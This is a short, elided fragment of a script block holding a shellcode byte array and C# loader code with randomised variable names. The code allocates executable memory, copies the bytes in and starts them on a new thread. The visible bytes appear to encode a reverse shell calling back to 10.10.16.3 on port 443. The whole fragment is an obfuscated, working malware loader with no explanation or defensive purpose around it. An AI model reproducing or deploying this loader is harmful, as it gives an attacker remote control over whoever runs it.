...
0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x0a,0x0a,0x10,0x03,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,
...
0x00,0x53,0xff,0xd5 };
        ...
        IntPtr zTv2q0vus = VirtualAlloc(IntPtr.Zero,(UIntPtr)iW6T6.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(iW6T6,0,zTv2q0vus,iW6T6.Length);
        IntPtr lbM = IntPtr.Zero;
        IntPtr uSgl = CreateThread(IntPtr.Zero,UIntPtr.Zero,zTv2q0vus,IntPtr.Zero,0,ref lbM);
    }
</script>
